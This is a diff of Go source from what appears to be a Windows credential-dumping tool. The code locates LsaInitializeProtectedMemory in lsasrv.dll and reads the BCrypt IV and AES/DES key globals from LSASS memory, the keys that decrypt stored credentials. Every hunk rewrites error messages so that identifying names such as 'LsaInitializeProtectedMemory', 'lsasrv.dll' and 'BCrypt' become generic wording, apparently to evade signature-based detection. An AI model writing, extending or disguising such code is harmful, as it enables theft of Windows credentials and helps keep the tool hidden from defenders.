@@ -155,11 +155,11 @@ type lsaCryptoGlobals struct {
 func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout, reader ...lsassReader) (lsaCryptoGlobals, error) {
 	pat, mask, err := parseHexPattern(layout.Sign)
 	if err != nil {
-		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad LsaInitializeProtectedMemory signature: %w", err)
+		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad crypto init signature: %w", err)
 	}
 	hit := findPattern(lsasrvBytes, pat, mask)
 	if hit < 0 {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory signature %q not found in %d-byte lsasrv.dll image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
+		return lsaCryptoGlobals{}, fmt.Errorf("crypto init signature %q not found in %d-byte target module image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
 	}
 
 	ivOff, _, ivOk := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
@@ -173,7 +173,7 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 		}
 		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat), r)
 		if scanErr != nil {
-			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
+			return lsaCryptoGlobals{}, fmt.Errorf("crypto init %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
 				layout.Name, ivOk, desOk, aesOk, hit, scanErr)
 		}
 		return scanResult, nil
@@ -408,7 +408,7 @@ func formatCryptoScanError(keyGlobals []cryptoScanCandidate, rejected []cryptoRe
 	if len(rejParts) > 0 {
 		rejStr = strings.Join(rejParts, "; ")
 	}
-	return fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning hit=%d (back 600, fwd 200, data-section brute-force); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
+	return fmt.Errorf("found %d distinct crypto key globals (need 2) scanning hit=%d (back 600, fwd 200, data-section scan); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
 		len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), rejStr, hexDump, hexPost)
 }
 
@@ -698,14 +698,14 @@ func readBcryptKeyMaterial(r lsassReader, globalAddr uintptr) (bcryptHandleKey, 
 	// Step 1: dereference the global to get the KIWI_BCRYPT_HANDLE_KEY ptr.
 	ptrBytes, err := r.Read(globalAddr, 8)
 	if err != nil {
-		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("read BCrypt key global at 0x%X: %w", globalAddr, err)
+		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("read crypto key global at 0x%X: %w", globalAddr, err)
 	}
 	if len(ptrBytes) < 8 {
 		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want 8", globalAddr, len(ptrBytes))
 	}
 	handleAddr := uintptr(binary.LittleEndian.Uint64(ptrBytes))
 	if handleAddr == 0 {
-		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("BCrypt key global at 0x%X holds NULL — LSASS hasn't initialized the key yet", globalAddr)
+		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("crypto key global at 0x%X holds NULL — LSASS hasn't initialized the key yet", globalAddr)
 	}
 
 	// Step 2: parse the KIWI_BCRYPT_HANDLE_KEY.
